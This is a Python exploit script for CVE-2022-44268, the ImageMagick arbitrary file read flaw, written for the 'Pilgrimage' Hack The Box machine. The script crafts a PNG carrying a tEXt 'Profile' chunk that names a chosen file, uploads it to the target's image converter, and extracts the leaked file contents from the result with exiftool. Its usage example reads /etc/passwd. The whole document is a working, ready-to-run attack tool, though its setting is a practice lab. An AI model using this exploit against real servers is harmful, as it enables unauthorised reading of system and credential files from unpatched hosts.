#!/usr/bin/env python3

"""
Pilgrimage HTB
--------------
Author: Marss
Date: 07 Aug, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from codecs import decode
from PIL import Image
from png import Reader, write_chunks
from re import findall
from requests import get, post
from requests.exceptions import ConnectionError
from shlex import split
from signal import signal, SIGINT
from subprocess import run
from sys import argv

import pdb

# Ctrl + c
# (function)
signal_handler = lambda signum, frame: exit('\n[!] User aborted.')
# (signal)  
signal(SIGINT, signal_handler)

# Main class
class Exploit:

    def __init__(self, args):
        
        self.args = args
        self.target_domain = None
        self.original_image = 'original_img.png'
        self.TexT_chunk_image = 'TexT_chunk_img.png'
        self.incrusted_file_image = 'incrusted_file_img.png'

        # proxies
        #self.proxies = {'http':'127.1:8080'}
    
    def run(self):
        try:    
            if self.target_response():
                self.create_image()
                self.insert_chunk()

                image_url = self.upload_image()
                self.download_image(image_url)

                hex_data = self.extract_incrusted_data()
                print(f'\n[+] File content:\n{self.hex_to_str(hex_data)}')

                if self.args.save:
                    self.save_file(hex_data)

        except Exception as error:
            exit('\n[!] Error: ' + repr(error))

    def target_response(self) -> bool:
        
        try:
            response = get(f'http://{self.args.target}', timeout=5)
            self.target_domain = response.url
            
            if response.status_code == 200:
                print('\n[+] Target up')
                return True
        except ConnectionError:
            exit(f'\n[!] Verify connection with the target or resolve the specific domain on your local DNS server (/etc/hosts)')

    def create_image(self):

        image = Image.new('RGB', (100, 100), color='black')
        image.save(self.original_image)

        print(f'[+] Original image: {self.original_image}')

    def insert_chunk(self):

        reader = Reader(filename=self.original_image)
        
        chunks = list(reader.chunks())
        text_chunk = (b'tEXt', b'Profile\x00' + f'{self.args.file}'.encode())
        chunks.insert(1, text_chunk)

        with open(self.TexT_chunk_image, 'wb') as file:
            write_chunks(file, chunks)

        print(f'[+] Text chunk image: {self.TexT_chunk_image}')

    def upload_image(self) -> str:

        file_data = {
            'toConvert': (
                self.TexT_chunk_image,
                open(self.TexT_chunk_image, 'rb'),
                'image/png'
            )
        }
        
        response = post(f'{self.target_domain}',
            files=file_data
        )
        converted_image_url = findall(r'\?message=(.*)&', response.url)[0]
        
        return converted_image_url

    def download_image(self, image_url):

        response = get(image_url)

        with open(self.incrusted_file_image, 'wb') as file:
            file.write(response.content)

        print(f'[+] Incrusted file image: {self.incrusted_file_image}')

    def extract_incrusted_data(self):

        try:
            command = f'/usr/bin/exiftool {self.incrusted_file_image}'
            
            content_data = run(split(command), capture_output=True)
            content_data_hex = findall(r'Raw Profile Type\s*:\s*\.\.\s*\d{1,5}(.*)', content_data.stdout.decode())[0].replace('.','')
            
            return content_data_hex
            
        except IndexError:
            exit('\n[!] The file doesn\'t exist or we do not have read permission')

    def hex_to_str(self, hex_data) -> str:

        return ''.join([chr(int(hex_data[i:i+2], 16)) for i in range(0, len(hex_data), 2)])

    def save_file(self, content):

        decode_data = decode(content, 'hex_codec')
        with open(self.args.save, 'wb') as file:
            file.write(decode_data)
        print(f'\n[+] File saved: {self.args.save}')

# Main flow
if __name__ == '__main__':

    title = '| CVE-2022-44268 |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -t 10.10.10.10 -f /etc/passwd'''
    )

    parser.add_argument('-t', '--target', type=str, required=True, help='Vulnerable target')
    parser.add_argument('-f', '--file', type=str, required=True, help='File to read')
    parser.add_argument('-s', '--save', type=str, help='Save the file readed')

    args = parser.parse_args()

    print(title)
    
    exploit = Exploit(args)
    exploit.run()
